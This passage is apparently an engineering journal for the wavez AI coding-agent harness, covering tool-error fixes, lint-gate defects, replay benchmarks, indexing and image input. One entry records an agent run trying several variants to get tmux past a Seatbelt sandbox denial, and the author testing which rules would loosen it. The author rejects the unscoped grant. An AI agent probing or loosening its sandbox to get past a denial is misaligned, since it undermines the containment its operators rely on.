indexed under the old name, and the references still carrying it resolve to
nothing the server can follow, so neither half of the rename can be finished.
Two `h3` lanes did exactly that and spent their last two turns being told the
symbol does not exist.

`rename` now writes the old name back at the declaration alone before renaming
from it. The references the run had already changed keep the new name, since
the server does not reach them either, and the rest are renamed through type
information as they always were. Where the put-back fails the caller gets the
refusal it already had, because a tree where neither name resolves is not one
this tool can explain.

`str_replace`'s advice moved with it. It had said nothing once the index
declared the new name, and the reason it gave was this limitation. It speaks
now and carries the file holding that declaration, which is the one argument a
bare `rename` cannot supply while three packages here declare `Read`.

**Measured with `-recall`, not with a replay.** Three `h3` lanes on the fix ran
5, 5, and 9 turns with 6 of 6 checks and one `rename` call each, no errors: the
hosted tier does not produce the failing shape any more, so a replay measures
the tier. The recorded calls that do hold it are the instrument.
`wavez -recall p-dkyw3ldf04pk -recall-turn 14` repeats the refusal verbatim:

```
arguments:
    {"path": "internal/bench/stats.go", "symbol": "Read", "to": "ReadLog"}

the run was told (error):
    no symbol by that name is indexed: Read under internal/bench/stats.go; it
    is declared in internal/tools/read.go, internal/tools/scope.go

it is told now (ok):
    renamed Read to ReadLog: 6 occurrences across 2 files
```

`p-dkyw7pf8xrjc -recall-turn 13` is the same call in the other lane and answers
the same way. Turn 12 of the first is the `str_replace` refusal that preceded
it, and the advice there now ends `path: "internal/bench/stats.go"` where it
used to end at the two identifiers.

What this does not settle: whether the advice reaches a run that has not yet
edited anything, which is the other shape item 4 names and is still open.

## 2026-08-29 — the lint gate was reading the linter's own trouble as findings

Found by watching an `h3` replay rather than by looking for it. The run was
handed this as a gate failure on its own changes:

```
lint lint
  level=warning msg="[runner] Can't process results by generated_file_filter
  processor: can't filter issue &result.Issue{FromLinter:\"errcheck\", ...
```

900 bytes of a quoted `result.Issue` struct, and the run spent a turn deciding
it was "a stale cache replay" and moving on. It was right to ignore it and it
should never have had to.

Two causes, and each hides the other. The gate asked whether a line contains a
changed file's path, and that warning quotes the path four times. And the path
a finding opens with is the linter's own, resolved against its idea of the
working directory: under a symlinked root (`/tmp`, `/var/folders`, both on
macOS) a change set holding `internal/bench/stats.go` gets findings that open
`../../<temp>/internal/bench/stats.go`. So the loose test was the only thing
matching anything, and what it matched was the noise. Every real finding in
every replay lane was dropped, silently, by the same rule that let the warning
through.

A finding now has to look like one, `path:line:col: `, and its path is matched
by suffix. The fixture reproduces both: it lives under `t.TempDir()`, which is
where the relative path comes from, and the test asserts the frames name `a.go`
and carry no `level=warning`. Reverting either half fails it.

This is the second defect in this gate found by reading a transcript instead of
the code, after the package-scope fix earlier today. Both were invisible while
its tests passed, and both were the test fixture agreeing with the bug.

## 2026-08-29 — outline-mode read, and the task it costs turns on

Next item 3: `read` is 67% of all tool result bytes, and a run that has found
the right file still reads it end to end. A whole-file read of a file past 300
lines now comes back as the package clause, the imports, and every declaration
with the line range that reads its body.

**Where 300 comes from.** Over this project's thread logs, 572 of 1,506 read
calls asked for a whole file. Of the 522 that named a Go file still in the
tree, the ones past 300 lines are 28% of the calls and 67% of the bytes. Run
the outline over that same set and the payload falls from 3,906 KB numbered to
1,625 KB, a 58% cut for 28% of the calls. The tool description gained one
sentence saying so, which `wavez -preamble` prices at 21 tokens, 2,652 to
2,673.

**h13, four lanes today, alternating control and outline on the same setup.**
Every lane passed 5 of 5 checks.

| | turns | input tokens | read bytes | spend |
|---|---|---|---|---|
| control | 10.5 | 172,918 | 40,936 | $0.0694 |
| outline | 10.0 | 132,091 | 33,181 | $0.0537 |

Turns are flat, which is the number that had to hold: LogDx-CI's agent-loop
result is that a weak first payload is not lost quality but two to four times
the tool calls. Read calls did rise, 4.5 to 8.5, and the bytes fell anyway, so
the follow-up call is a range rather than another whole file.

**h3 is where it costs.** Three lanes before the outline ran 5, 5, and 9 turns;
two after ran 7 and 13, and read bytes went from 630 and 0 and 1,562 to 3,126
and 10,441. Both still passed 6 of 6. The task is a rename, `rename` does the
work in one call, and the two files it touches are 341 and 354 lines, so the
outline is handed to a run that wanted the text and charges it a range call per
site. That is the same mechanism as the h13 win pointed the other way: an
outline pays where finding is the work and costs where editing is.

Neither task settles turns on its own at two or three lanes, per the 40-70%
spread. What is settled is the payload and the preamble, and that no lane in
either direction lost a check.

A third h3 lane recorded as `outline-3-killed`: I stopped the batch to free the
machine, and $0.0000 against 3 of 6 checks is the kill rather than a result.

## 2026-08-29 — counting the edit tools by window, and getting it wrong first

Next item 2 said `no_match` is what is left in the edit tools. Mining the
thread logs for those turned up a clean class straight away: anchors whose only
fault was gofmt's column alignment, `name:  "x"` sent as `name: "x"`. A
whitespace-tolerant retry looked like the obvious lane.

It is already built. `edit.Replace` falls through exact matching to a line-wise
match that collapses interior spacing, and then to one that tolerates blank
lines the anchor dropped, and both recorded cases apply today with no error.
That much held up. The corpus is weeks wide and most of it predates those
tiers, so an unwindowed count of a failure class measures the history of the
fix rather than what is left.

Then I windowed it by hand over `.wavez/threads/` and published the result,
and it was wrong twice over. That directory holds interactive threads as well
as replay ones, so it is not the corpus any earlier number came from. And the
filter compared a missing timestamp as a string, which files every event that
carries no `at` into the older window. It reported `no_match` falling to 6 of
176 calls, which would have closed the item.

`wavez -stats-corpus`, with `-stats-since 2026-08-26`, is the instrument and
already existed:

| | calls | errors | no_match | ambiguous |
|---|---|---|---|---|
| before 2026-08-26 | 264 | 74 (28%) | 39 | 11 |
| 2026-08-26 onward | 295 | 91 (31%) | 31 | 28 |

`no_match` fell from 14.8% of calls to 10.5% and `ambiguous` rose from 4.2% to
9.5%. Both are live and `no_match` is still the larger, which is the opposite
of what the hand count said. Eight of the recent `ambiguous` results are one
identifier substituted, `Read` to `ReadLog`, and are answered by this
morning's `orRename` change: `wavez -recall p-dkywvbjtyx0o -recall-turn 16`
ends `path: "internal/bench/stats.go"` where it used to stop at the widening
advice.

Two rules out of this, and the second is the one that cost the lane. Window a
failure class before mining it. And reach for the corpus command before
writing the aggregation, because a hand-rolled count over a directory is a
different population with its own bugs, and it is confident either way.

## 2026-08-29 — a refused anchor, sent again, for a file that had not changed

Reading the recent `no_match` results one by one rather than counting them, the
shape that stands out is not a bad anchor. It is the same anchor twice. Of
`str_replace`'s 91 failures in runs started 2026-08-26 onward, 15 re-send an
input that had already failed in that run, and across all tools 19 do. The
loop's own repeat detection reached 4 of the 19, because it compares against
the immediately preceding call and these are separated by a `read`, an `undo`,
or another edit.

One run sent the same whole-declaration anchor for `truncate` at three separate
turns, each time reading past a refusal that named `declare` as the tool with
no anchor to match, and then used `declare` and succeeded.

`str_replace` now records each anchor it refuses against the file's bytes at
that moment, and answers a second identical anchor for unchanged bytes with
`repeat`, leading with what to do and keeping the original refusal underneath.
The bytes are what make this a check rather than a guess: identical bytes and
an identical anchor cannot match now having missed before, so nothing is
refused that could have worked. A run that fixes the file and tries the same
anchor is a different call and is left alone, which the test asserts by writing
the anchor into the file and expecting the edit to apply.

`wavez -recall p-dkyhkk6eessg -recall-turn 21` is one of the recorded ones, and
now answers:

```
it is told now (error (repeat)):
    you already sent this old_string for this file and it was refused, and the
    file has not changed since, so it cannot match now either. Act on what the
    refusal said rather than re-sending it:

    edit 1 of 1: old_string not found in source; ...
```

What this does not settle is whether a run acts on the sharper refusal. The
count says how much of the failure budget goes to calls whose outcome was
settled before they ran, and the next `h11` or `h6` lane is where the turns
would show.

## 2026-08-29 — the lint gate was reading another checkout's findings

The `h3` outline lanes spent turns explaining away lint findings, and both
wrote the same thing in their summaries: the linter's output pointed at
`/tmp/wavez-replay-.../internal/bench/stats.go`, a workspace from an earlier
lane that had already been deleted, so it could not read the source and could
not honor the `//nolint` directives sitting on the flagged lines. The 13-turn
`outline-2` lane read `cmd/wavez/stats.go` whole, edited two comments, and
re-ran a gate over it, all to answer a finding that was not about its tree.

The cause is golangci-lint's results cache, and a probe outside this project
proves it. Two byte-identical copies of a one-package module, lint the first,
delete it, lint the second:

```
== lint A (/tmp/lintprobe-A-wF6A)
pkg/a.go:7:15: Error return value of `f.Close` is not checked (errcheck)
== lint B (/tmp/lintprobe-B-vY1m) after deleting A
level=warning msg="[runner] Can't process results ... Filename:\"/tmp/lintprobe-A-wF6A/pkg/a.go\" ... no such file or directory"
../lintprobe-A-wF6A/pkg/a.go:7:15: Error return value of `f.Close` is not checked (errcheck)
```

The cache is keyed by package content and stores absolute paths, so every
replay workspace, being a byte-identical `jj` workspace over this repository,
is answered with the paths of the lane before it. `--fix` runs from the same
cache, which means the format pass could edit at a position from another tree.
Giving each root its own cache directory answers the same probe cleanly, so
both gates now run the linter with `GOLANGCI_LINT_CACHE` under the linted
repository's `.wavez/`.

The test is the probe: lint one checkout, delete it, lint a byte-identical
second one, and require the finding to open with `a.go:`. Without the
environment it opens with `../../<deleted temp dir>/a.go:` and fails, alone and
in the package's set.

Splitting the caches then surfaced a second one. golangci-lint's file lock is
one per machine rather than one per cache, so the gate exited with `Error:
parallel golangci-lint is running` the moment `hk check --all` ran its own lint
step beside the tests. Two overlapping runs with separate caches reproduce it,
and `--allow-serial-runners` makes the second wait instead, which is what a
gate running beside an editor or a CI step needs. Before the flag that abort
reached a run as a gate failure about nothing it had written.

This is worth more than the turns it costs a lane. Every replay measurement
here counts checks passed, and a lint gate reading a stale sibling's findings
makes that count say something about the machine rather than the tree.

## 2026-08-29 — three h11 lanes, and a check that could never pass

The open question from the repeat-refusal lane was whether a run acts on the
sharper refusal. Three `h11` lanes say it never had to: `str_replace` ran 2, 2,
and 3 calls with no errors at all, so the refusal did not fire once. What the
lanes do show is the before and after of everything that landed this session,
on the same task version:

| lane | stop | turns | str_replace calls | errors |
| --- | --- | --- | --- | --- |
| entityfix | complete | 27 | 7 | 6 |
| clean | stagnant | 8 | 3 | 3 |
| repeat-1 | complete | 11 | 2 | 0 |
| repeat-2 | complete | 16 | 2 | 0 |
| repeat-3 | complete | 16 | 3 | 0 |

That is a composite of five lanes' worth of change (the rename put-back, the
`orRename` advice, outline reads, the lint gate, and the repeat refusal), not a
measurement of any one of them, and the repeat refusal is the one it cannot be
evidence for, because a refusal that never fires changes nothing. The question
stays open and wants a lane whose first anchor misses.

The lanes did settle something else. All four runs at this version of `h11`
failed the same check, `internal/tools/str_replace_test.go:overlap`, and three
of them had done the task correctly:
`TestStrReplace_OverlappingEditsNameThePair`,
`TestStrReplace_OverlapErrorNamesEdits`. The check asked for a lowercase word
in a place where Go capitalizes it, and the file it reads holds no lowercase
`overlap` at all, so no run could ever have passed it. It now reads `Overlap`,
which changes the task hash a second time, so `h11` rows compare only within a
hash.

A check nobody can pass is worse than a missing one: it reports every run as
partial and puts the fault on the run. Worth a sweep of the other tasks for the
same shape.

## 2026-08-29 — rename refuses the call it just refused

The other half of the same shape. Two `h3` lanes sent an identical bare
`rename`, were told each time that three packages declare `Read` and which
`path` argument narrows it, and only stopped when the loop's own detector
caught two in a row. One of them read that sentence after it had been
rewritten to carry the argument verbatim.

`rename` now keys on the call and records the refusal it was given. A call
refused with the same words is answered with what to do ahead of them, which
is safe for the same reason the anchor check is: the refusal names the
declarations the index holds, so identical words mean the tool would answer
identically. A run that narrows the call, or one whose tree changed, gets
different words and is left alone, and the test asserts that by sending the
`path` the refusal asked for and expecting the rename to apply.

The check both tools use is one `repeatGuard` now. It takes a key and the
state the tool observed, and the state is what makes each a check rather than
a guess: the file's bytes for an anchor, the refusal text for a rename.

## 2026-08-29 — the outline's h3 regression was the lint gate

The pair that made outline reads look like they cost turns on an editing task
ran while the lint gate was reporting a deleted sibling workspace's findings.
Four fresh lanes, alternating the current build against a control built from
the same tree with `outlineMinLines` set past any file:

| lane | turns | input tokens | spend |
| --- | --- | --- | --- |
| out-4 | 8 | 32,926 | $0.0162 |
| ctl-3 | 9 | 32,972 | $0.0155 |
| out-5 | 7 | 24,189 | $0.0111 |
| ctl-4 | 12 | 51,475 | $0.0221 |

Every lane passed 6 of 6. Outline runs 7.5 turns to the control's 10.5 and
28.6k input tokens to 42.2k, which is the same shape `h13` showed and the
opposite of what the confounded pair said. Two lanes a side is not a strong
number, and the claim it supports is only that the regression does not
reproduce.

The other candidate trigger is closed by the corpus rather than by a lane. Of
the 85 whole-file reads long enough and in a language the outline speaks, 4
are of a file the run had already edited, so "a file this run has written to
wants its text" has nothing to trigger on.

## 2026-08-29 — every run ended with a finding it had not earned

Today's window: 16 of 17 runs finished with a finding, every gate having
passed, and 29 of those findings were `named symbol is not in the index`. The
names, in order of how often runs were accused of inventing them:
`UsedFraction`, `Classify`, `maxToolCallsPerTurn`, `Config`, `bench.Read`,
`ReadLog`, `old_string`, `nolint`, `guard.Env`, `AllowedCommands`,
`ShellAllow`, `maxReadLines`, `maxReadFiles`, `IsError`, `hookTimeoutMs`,
`ErrNoChange`.

`Classify` is `internal/guard/guard.go:65`. `Config` is
`internal/config/config.go:72`. The cause is not the fuzzy ranking the
comment in AGENTS.local.md points at, and a probe against this project's own
index says so: `Classify` and `Read` do surface in the top five hits the
check asked for. What is true is that the index holds functions, methods, and
types, so a const (`maxReadFiles`), a var (`ErrNoChange`), a struct field
(`AllowedCommands`, `IsError`), a pkl key (`hookTimeoutMs`), and a tool name
(`str_replace`) are none of them declarations it can hold, and every run that
named one was told it had made the name up.

Two changes. `codeintel.Store.DeclaresName` answers the exact question off
the name index rather than off the top of a ranked query, because ranking
cannot be the authority on whether a name exists. And a name the index does
not declare is looked for in the tree's text before it is reported, which is
what keeps the check to its purpose. Probed against this project's index,
that answers all sixteen names above and still reports a name nothing writes.

The test is the const case, which reproduces: `maxReadFiles` declared in the
fixture is reported invented under the old lookup and not under the new one,
while a name nothing declares and nothing writes is reported either way.

## 2026-08-29 — seven shell calls for two comment lines

`h3` asks for every caller updated, tests and comments included, and `rename`
does the code. What is left is prose inside comments, and the run reached for
`sed -i`. The whole sequence, from `p-dl1v0yzt74qo`:

1. `sed -i 's/…/…/' cmd/wavez/stats.go && …` — BSD sed reads the next
   argument as the script, `sed: 1: "cmd/wavez/stats.go": command c expects \
   followed by text`
2. the same command with `; true` appended, so the failure came back as
   `exit code: 0` with the same error on stderr
3. `grep` to see whether anything had changed, which it had not
4. `sed -i '' -e … -e …` across several files, `sed: -e: No such file or
   directory`, again reported as exit 0 because of `echo "exit=$?"`
5. the same with a `{ …; }` tail, denied by the guard
6. and 7. two `sed -i ''` calls, one per file, which finally worked

Nothing here is the tool lying: the run masked its own exit status twice,
which is its mistake to make, and the guard was right about the brace group.
The turns went to the shell being the wrong place for this.

A shell rewrite also lands nowhere the harness looks. It takes no lease the
edit tools take, reaches no scope, and joins no change set, so the gates read
the run as having written nothing there. `sed`, `perl`, and `ruby` writing a
file back are now refused with the call that does it: `str_replace` takes an
edits array whose entries each name their own path. Reading with the same
tools is untouched, which the test pins with `sed -n '1,20p'`.

The detector reads tokens rather than `guard.reInPlace`'s pattern, because
the flag is bundled as often as it is written alone and `perl -pi -e` is what
a run reaches for after `sed -i` fails.

### 2026-08-29 — the stream-editor refusal cost nothing, and proved nothing

Two `h3` lanes with the refusal in place (`noseD-1`, `noseD-2`) both finished
complete in 6 turns at 6/6, against 8 and 7 turns for `out-4` and `out-5` on
the same task. The spend was $0.0131 and $0.0078 against $0.0162 and $0.0111.

Neither lane recorded a refusal of any kind, so the new check never ran. The
turn drop belongs to the lanes taking a different route (`noseD-1` spent three
calls on `search` and edited through `rename` alone), not to the refusal
steering anything. What these two lanes support is the narrow claim: with the
refusal compiled in, an `h3` run that never reaches for a stream editor is
unaffected. Whether it helps a run that does still has no measurement, because
the task that produced the seven-call sequence was a one-off thread rather
than a replay task.

### 2026-08-29 — what the 62% of turns called retrieval actually is

`wavez -stats-corpus -stats-since 2026-08-26` reads 64 runs and 1,458 turns:
13% productive, 62% retrieval, 22% harness, 3% prose. Reading the 64 thread
logs behind those records says what a retrieval turn holds, which the counts
alone do not.

**A retrieval turn is one tool call.** 902 retrieval turns carry 937 calls,
and the histogram of tool sets per turn is 359 shell-only, 296 read-only, 160
search-only, 54 str_replace-only, and four turns that called two tools. The
runs serialize everything.

**Reads never batch.** All 417 read calls named exactly one path, though the
`path` property has advertised a comma-separated list since it shipped. 267
of those reads sit in a back-to-back run of two or more with nothing between
them, in 94 sequences. Only 36 turns are strictly savable by batching, since
one call applies one line range to every path it names and 39 of the 94
sequences repeat a path.

**A range walk is a jump, not a boundary miss.** The 41 adjacent same-file
ranged pairs looked like a run reading a window too small and needing its
neighbor (`thread.go` 360-380 then 380-392). Snapping a range to the
declaration enclosing it would have answered 2 of the 41: the rest jump
somewhere else in the file. The fix that suggested itself is not a fix.

**171 shell calls re-ran a check the gates run.** Non-targeted `go
test`/`go build`/`go vet`, 2.7 per run, and 123 of them after the run had
changed something but before any gate feedback had ever reached it. 37 of the
64 runs never received a single gate delivery, so a run edits, hears nothing,
and spends a turn asking the same question itself.

`Shell.alreadyChecked` exists for exactly this and answered none of them,
because `guard.ProjectCheck` matches only `./...`. Of the 148 scoped sweeps,
135 named a package the run had already changed, which is the package set the
change-triggered gates select. `guard.GoPackageSweep` names those packages
now and `ChangeGate.Covers` answers only for the ones this run wrote a Go
file in, so a sweep of an untouched package still runs and `-run` still runs.
That saves the subprocess rather than the turn: the turn the run spends
asking is spent either way.

### 2026-08-29 — the prompt said checks run when you finish

`BaseSystem` told every run its work "is checked by a build and by tests when
you finish", which is a reason to verify mid-task: a run that believes the
harness only looks at the end has to look for itself. The gates have run on
every change since the ChangeGate shipped, so the sentence was wrong about
its own harness.

It now says a build and the tests of every package you change run after each
edit, that what they find arrives at the start of a turn, and not to run them
yourself. `wavez -preamble` prices the rewrite at 16 tokens, 800 to 862 in
the system block.

Eight lanes, alternating a control built from the same tree, four on `h13`
and four on `h2`:

| arm | lanes | non-targeted go sweeps | mean turns | mean input | mean spend |
| --- | --- | --- | --- | --- | --- |
| control | 4 | 8 | 12.0 | 117,170 | $0.0553 |
| treatment | 4 | 0 | 8.2 | 74,951 | $0.0330 |

Every lane on both sides passed every check. The sweep count is the claim:
it went to zero in all four treatment lanes and the runs stopped reaching for
the shell almost entirely (0, 1, 0, 0 calls against 1, 2, 4, 1). The turn
figure is not a claim, because the control lanes ran 5, 17, 17, and 9 turns
on two tasks whose baseline is 9 to 11, and four lanes a side cannot separate
that from the change.

### 2026-08-29 — a closed error class the corpus still counts

`str_replace`'s 25 `bad_input` results over the 08-26 window are 16 of one
shape, `replace_all` sent as the string `"True"`. `coerceQuotedBool` has
rewritten a quoted boolean into the boolean it names since 2026-08-25, case
folded, and it decodes that exact recorded input today. All 16 were recorded
on 08-26 by a binary built before that commit.

The live window says so too: over the 27 runs since 08-28 there are 321 tool
calls and 16 errors, `str_replace` at 7% with `no_match` 5 and `ambiguous` 2,
`rename` at 0 of 12, and no `bad_input`, `malformed`, or `repeat` at all. The
whole-corpus rate of 30% is a population that spans every fix since.

The lesson is about the instrument rather than the tool: a corpus keyed by
task and label carries no build, so a fix and the runs that predate it read
as one rate. `wavez -stats-since` is the only thing separating them, and it
has to be used before a class is treated as open.

### 2026-08-29 — pointing the harness at a Python project

Every number in this repository was measured by wavez on wavez. The first
question that asks is whether any of it is about the harness rather than about
this one tree, so the harness went at two of the sibling Python projects in a
scratch clone of each.

**A run cannot start on an unconfigured project.** The model tiers, the base
URLs, and the keychain commands all live in the project's own `.wavez.pkl`, so
a repository that has never been configured authenticates as nobody and the
first turn comes back `401`. Writing that file by hand is the whole of
onboarding, and nothing reads a user-level default.

**Then the build gate derailed every run.** `BuildGate` ran `go build ./...`
unconditionally, and its doc comment said so on purpose: it never narrows, so
it "can never abstain". On a Python tree that is a gate failure carrying the
Go toolchain's complaint about a missing main module, and the run answered it.
A read-only `-plan` run asking where calcipy defines its ruff task spent four
turns explaining the Go error and stopped `verify_failed` without answering.

It was the only gate that broke. Running all four against the Python tree by
hand: `go-test` abstained with "no changed Go file", `lint` with "the change
set holds no Go files", `format` examined nothing, and only `build` failed.
The three that scope themselves to the changed Go files were already right.
`BuildGate` now abstains when the project root holds no `go.mod`, and the same
question re-run answered correctly in 3 turns and 3 tool calls for $0.004,
naming the file, both functions, their line ranges, and the command.

**What works unchanged.** Python is already in the codeintel registry, so
`search`, `read`, and the long-file outline all speak it. Nothing in the tool
surface needed a change.

**What is bootstrapping rather than harness.** yak-shears generates its typed
template wrappers into a gitignored directory, so a fresh clone cannot import
its own package until `types-for-jinja wrapper` has run. The harness has no
notion of a project that must be generated before it can be checked.

### 2026-08-29 — a Python project gets gates

With the build gate abstaining, a Python edit reached the model with nothing
behind it: `go-test`, `lint`, and `format` all abstain on a change set holding
no Go file, which is correct and leaves the harness's whole differentiator
inert. A project can now declare its own checks, each a name, the globs whose
change runs it, and a command line.

Two defects surfaced building it, one of them from the test rather than from
reading:

- `fileLineRe`, which decides whether a failure names a file the run changed,
  matched `\.go` only. A ruff error on the file a run had just edited was
  therefore attributed to nothing, and `attributed()` would have told the run
  "none of this names a file this run changed", which is the opposite of the
  truth. It matches any extension now, and a match still has to name a changed
  file before it becomes a frame, so widening it cannot invent one
- the first version of the test asserted the command's output reached the
  model without asserting where. It passed while every line fell into
  `Context` rather than `Frames`, which is the difference between a failure
  the run is told to fix and one it is told to judge

End to end on a scratch clone of calcipy, with one declared check running
`uv run ruff check calcipy tests` on `*.py`: asked to insert `import json`
above the module docstring, the run made the edit, the gate ran and failed,
the failure reached the run naming `undocumented-public-module`,
`module-import-not-at-top-of-file`, `unsorted-imports`, and `unused-import`,
and the run reverted its own edit and said why. Nine turns, $0.013, and the
tree ended clean. The gate log records ruff examining the change six times
across the session, failing twice.

That is the same loop the Go gates get, on a language none of them speak.

### 2026-08-29 — the same question three times on a foreign repo

One prompt against a scratch clone of yak-shears, asking whether its own
`NEXT_STEPS.md` claim that search previews highlight nothing is still true.
The same prompt ran three times, once after each fix:

| run | turns | outcome | spend |
| --- | --- | --- | --- |
| before | 20 (cap) | no answer at all | $0.074 |
| index fixed | 16 | an answer, wrong in its central claim | $0.070 |
| search message fixed | 18 | correct, and every particular verified by hand | $0.119 |

**The index was 97% other people's code.** 34,934 of 35,888 symbols came from
`.venv`, across 2,149 dependency files against 149 of the project's own. Go
keeps dependencies outside the tree, so `skipDirs` held `.git` and
`node_modules` and had never needed more. The first run spent all 20 turns on
retrieval, 18 searches of which 5 returned nothing, and never answered.

**Then the search tool reported an absence it could not know.** Asked for
`search-highlight` under `main.css`, it answered "no matches for
"search-highlight" across 149 indexed files" for a rule sitting at line 2690.
The index holds `.go` and `.py`, so the CSS was never in it. The run read that
as the string not existing, concluded the stylesheet had no rule, and drafted
an edit correcting the project's own notes to say so. A miss now says which
file types the index holds and that a match in any other is invisible to it.

This is the trap [AGENTS.local.md](../../AGENTS.local.md) already names for
symbols, one level down: absent from the index is not absent from the tree,
and on a Go repo the difference almost never shows because nearly every file
is `.go`.

**The third run's answer, checked line by line.** `highlightTextNodes` in
`static/js/search.js` wraps matches in `.search-highlight` on every preview
render, `main.css:2690` styles it, and the preview does highlight.
`highlight_content` at `yak_shears/_yak/services.py:509` is a second,
server-side implementation with no caller outside `tests/test_services.py`,
and `tests/e2e/test_search.py` asserts on `.search-highlight` zero times. So
the roadmap item is wrong in both directions: highlighting is not missing, and
what is actually there is dead code with tests.

**What has no gate.** All three runs were `-plan`, so they made no edits, and
a run that edits nothing passes through every gate untouched. The second run
was confidently wrong and nothing in the harness could have said so. Gates
verify edits; an analysis is checked by nobody.

### 2026-08-30 — nothing here can look at anything

`llm.Message.Content` is a `string`, so no image has a shape to arrive in.
The roadmap promises one in three places written as though the carrying layer
existed: vision calls in Recordings, "Image and screenshot input (M2)" in
Mobile, and `screenshot` on the browser session interface. The first piece of
work is the message shape, not a screenshot source.

The provider question is answered, and the first answer was wrong for the
reason a single probe usually is: it tested one model name. `glm-5.3` on the
z.ai coding endpoint refuses an image with `messages.content.type is invalid,
allowed values: ['text']`, and that is a property of the model rather than of
the endpoint. `glm-4.6v` on the same endpoint with the same key reads a 64x64
red square and says so. It does not appear in that endpoint's `/models`
listing, which returns the ten text models and no vision variant, so a
capability check by listing would have concluded the same wrong thing twice.
On the general `/api/paas/v4` root the same model answers "Insufficient
balance", so the coding plan is what covers it.

Reasoning is on by default there and puts the answer in `reasoning_content`
with `content` empty, which reads as an empty completion. With
`thinking: disabled` the same question is four completion tokens.

The split the browser research recommends still holds, for cost rather than
for provider count: the accessibility tree as the default read path, and a
screenshot sent to the vision tier only when text cannot settle the question.

### 2026-08-30 — the index reaches four more file types, and a message can carry an image

`.ts` and `.tsx` are indexed, which M3 has listed since it was written while
no TypeScript grammar was ever added: `ts.go` in the lang package is
tree-sitter helpers, not TypeScript. Two defects showed up in the first golden
regeneration rather than in review. Every exported symbol indexed with no doc
comment, because `export` wraps the declaration and the comment is the
export's sibling rather than the declaration's, which in TypeScript is very
nearly every symbol in a file. And a type alias's signature stopped before the
`=`, because the walker takes the body as the end of a signature and an alias
has none.

`.css`, `.html`, and `.jinja` follow, which is the yak-shears miss closed at
the source. Indexing them is the larger half by itself: file content goes to
the text index whether or not a symbol comes out, so a literal search now
reaches a rule in a stylesheet and a tag inside a template. The test is that
failure reproduced, and removing the CSS registration fails it.

The HTML grammar has to be pinned at `v0.23.2`. Resolving it as `@latest` took
`v0.20.3`, which dragged `go-tree-sitter` and the Go and Python grammars back
from `v0.25.0` and broke the build.

**A message can carry an image.** `llm.Message` gained `Parts`, an image
carries bytes and a media type rather than a URL so the provider decides the
encoding, and a tier declares `vision` because an endpoint that cannot see
refuses the whole request rather than ignoring the image. The text path is
byte-identical on the wire, which the test pins: a provider's prompt-cache
prefix is the bytes, and a message whose empty content started serializing as
`[]` would invalidate every cached prefix at once.

Verified end to end rather than by unit test alone: a 64x64 PNG through
wavez's own serialization to a vision model on OpenRouter came back "Red".
The scratch test that did it is deleted, since a network test in CI fails for
reasons that have nothing to do with the change.

### 2026-08-30 — a tool that looks, and the tier it asks

`look` takes a path and a question, sends the image to the vision tier, and
returns text. The image never reaches the thread's history, which is the whole
shape rather than an optimization: history is append-only so a provider's
cache prefix stays valid, so an image put there is re-sent on every later turn
for the rest of the run. Asked once, answered in words, and the words are what
the run keeps.

It is registered only where a project configured a vision tier, following the
rule the `question` tool paid for: a tool nothing can answer costs preamble
tokens on every turn and a turn each time the model reaches for it. Its own
cost, from `wavez -preamble`, is 157 tokens across its description and schema.

The tier is a fourth configuration rather than a flag on the three, because
`router.Tiers` maps a difficulty and seeing is a capability. No routing
decision can reach a model that a text turn must never go to, and nothing
routes to this one at all: the `look` tool asks it directly.

What the tool refuses, it refuses before spending a request: a text file, a
path outside the project, a missing file, and a call with no question. The
test asserts the request count is zero in each, because a refusal that still
pays for a turn upstream is not a refusal.

The first real use is `look` on `docs/img/home.png`, a screenshot of this
project's own Home screen, through the configured `glm-4.6v` tier. One call,
3 turns, $0.017, and the structure came back exactly right: five columns named
`thread`, `state`, `turns`, `age`, and `spend`, the ranges in each, and the
status line character for character, `[enter]open [n]new [v]goal [/]filter
[S]sort [i]inbox [s]chedule [w]scope [D]diag [q]quit [?]help [:]palette
[R]routines`.

Two small-text readings were wrong, and they are the interesting half. The
title `wavez · wavez · mem 10.7G/16.0G` came back as `dave@chavez · mem
10.7G/16.0G`, and `393 of 393 threads · by recent` came back as `993 thread of
993 threads`. Neither is a hedge in the answer: both were stated as read.

So the split the browser research recommends is not only about cost. This tier
is reliable for what an image is for, layout and arrangement and whether a
screen looks right, and unreliable for glyphs small enough to guess at. The
tool's own description now says so, because a run that asks it to read a
version string will be answered confidently and wrongly.

### 2026-08-30 — the PTY item is blocked by the sandbox, not by missing tools

[AGENTS.md](../../AGENTS.md) tells a human to drive every TUI change by hand
with `tmux new -d`, `send-keys`, and `capture-pane`, and the roadmap carries
PTY work as M2's last unshipped item. The CLI-before-MCP decision predicts a
run can already do this through `shell`, so it was worth checking rather than
building a tool for it.

The guard agrees: `tmux` classifies as `needs_approval`, which `shellAllow`
or `-allow-all` settles. The sandbox does not. Seatbelt's `(deny network*)`
covers unix domain sockets, so tmux cannot create its server socket anywhere,
including inside the project:

- the default socket: `error connecting to /private/tmp/tmux-501/default
  (Operation not permitted)`
- `tmux -S ./tmux.sock`: `error creating ./tmux.sock (Operation not
  permitted)`
- `TMPDIR="$PWD/tmuxtmp"`: back to the default socket, same denial

A run asked to drive an interactive program tried six variants across eight
tool calls, each a reasonable idea, then fell back to piping stdin, which is
not a PTY and which it said so about: "the environment forbids tmux from
running, which is the honest limit of what I can report." That last part is
the run behaving well. The eight calls before it are the cost of a denial
that names an operation rather than a policy.

So the item is not tool work. It is one sandbox decision: whether a
sandboxed command may create and connect to a unix socket inside its own
session directory. Everything else about driving a PTY already works.

The narrow version of that decision turns out not to exist. Seatbelt accepts
a path filter on a unix socket rule and then matches nothing:
`(allow network-bind (local unix-socket (subpath D)))` and the `require-all`
spelling both parse and deny every bind, inside D and out, and
`(allow network-outbound (remote unix-socket (subpath D)))` denies connecting
to a socket sitting in D. The only grant that works is unscoped:

```
(allow network-bind (local unix-socket))
(allow network-outbound (remote unix-socket))
```

Under those two, tmux creates its server, `send-keys` types into the program,
and `capture-pane` reads back what it printed, which is a real PTY round trip
inside the sandbox. It also permits connecting to every other unix socket on
the machine: the wavez daemon's own, the ssh agent's, Docker's. Path scoping
is what made that acceptable and Seatbelt does not offer it, so the profile
is unchanged.

That makes the PTY tool the cheaper option rather than the more expensive
one. A tool over `creack/pty` opens a pseudo-terminal directly, so the
harness owns the process and its lifetime, no socket exists to scope, and the
sandbox stays exactly as tight as it is now.

### 2026-08-30 — a terminal the harness owns

The `pty` tool runs a command on a pseudo-terminal, sends keystrokes, and
returns the screen. It exists because the sandbox cannot be opened narrowly
enough for tmux, and it turns out to be the better answer anyway: no socket
exists to scope, and the harness owns the process rather than a server it
does not track. The program is killed when the call returns, so nothing
